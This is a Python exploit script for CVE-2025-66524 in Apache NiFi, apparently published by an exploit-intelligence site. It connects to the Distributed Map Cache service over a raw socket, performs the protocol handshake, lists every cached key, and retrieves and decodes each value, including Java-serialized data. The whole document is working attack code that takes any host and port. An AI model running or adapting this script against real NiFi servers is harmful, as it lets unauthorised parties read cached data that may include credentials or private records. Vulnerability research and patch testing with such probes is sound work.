#!/usr/bin/env python3
# Exploit Title: Apache NiFi - Distributed Map Cache Probe
# Exploit Author: Exploit Intelligence Platform (EIP)
# Vendor Homepage: https://nifi.apache.org/
# CVE: CVE-2025-66524
# Reference: https://exploit-intel.com
"""
Probe the NiFi Distributed Map Cache to examine what keys exist
and what format the data is in.
"""
import socket
import struct
import sys

def nifi_connect(host, port, timeout=10):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.connect((host, port))
    return sock

def nifi_handshake(sock):
    sock.sendall(b'\x4e\x69\x46\x69')  # "NiFi"
    sock.sendall(struct.pack('>I', 3))    # Version 3
    status = sock.recv(1)
    assert status == b'\x14', f"Handshake failed: {status.hex()}"
    return True

def nifi_keyset(sock):
    """Get all keys from the cache."""
    buf = struct.pack('>H', 6) + b'keySet'
    sock.sendall(buf)

    # Read response: set of length-prefixed byte arrays
    keys = []
    # Read number of keys (int)
    count_bytes = sock.recv(4)
    count = struct.unpack('>i', count_bytes)[0]

    for _ in range(count):
        klen_bytes = sock.recv(4)
        klen = struct.unpack('>I', klen_bytes)[0]
        if klen > 0:
            key = b''
            while len(key) < klen:
                key += sock.recv(klen - len(key))
            keys.append(key)
    return keys

def nifi_get(sock, key_bytes):
    buf = struct.pack('>H', 3) + b'get'
    buf += struct.pack('>I', len(key_bytes)) + key_bytes
    sock.sendall(buf)

    vlen_bytes = sock.recv(4)
    vlen = struct.unpack('>I', vlen_bytes)[0]
    if vlen == 0:
        return b''
    value = b''
    while len(value) < vlen:
        value += sock.recv(vlen - len(value))
    return value

def nifi_close(sock):
    try:
        sock.sendall(struct.pack('>H', 5) + b'close')
    except:
        pass
    sock.close()

def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "cve-2025-66524-services-patched"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 4557

    print(f"[*] Connecting to {host}:{port}...")
    sock = nifi_connect(host, port)
    nifi_handshake(sock)
    print("[+] Connected and handshake complete")

    print("\n[*] Enumerating cache keys...")
    keys = nifi_keyset(sock)
    print(f"[+] Found {len(keys)} keys")

    for i, key in enumerate(keys):
        print(f"\n--- Key {i} ---")
        print(f"  Length: {len(key)} bytes")
        print(f"  Hex: {key.hex()}")
        if key[:2] == b'\xac\xed':
            print(f"  Format: Java serialized (ObjectOutputStream)")
            # Try to decode the string from Java serialization
            if key[4] == 0x74:  # TC_STRING
                slen = struct.unpack('>H', key[5:7])[0]
                s = key[7:7+slen].decode('utf-8', errors='replace')
                print(f"  Decoded String: {s}")
        else:
            try:
                s = key.decode('utf-8')
                print(f"  Format: Plain UTF-8 string")
                print(f"  Decoded: {s}")
            except:
                print(f"  Format: Unknown binary")

        # Get value
        # Need new connection for each GET since keySet may have consumed the response

    nifi_close(sock)

    # Now get values for each key
    for i, key in enumerate(keys):
        sock = nifi_connect(host, port)
        nifi_handshake(sock)

        value = nifi_get(sock, key)
        print(f"\n--- Value for Key {i} ---")
        print(f"  Length: {len(value)} bytes")
        if value:
            print(f"  First 32 bytes (hex): {value[:32].hex()}")
            if value[:2] == b'\xac\xed':
                print(f"  Format: Java serialized (ObjectOutputStream)")
            else:
                try:
                    s = value.decode('utf-8')
                    print(f"  Format: UTF-8/JSON text")
                    print(f"  Content: {s[:200]}")
                except:
                    print(f"  Format: Unknown binary")
        else:
            print(f"  (empty)")

        nifi_close(sock)


if __name__ == '__main__':
    main()
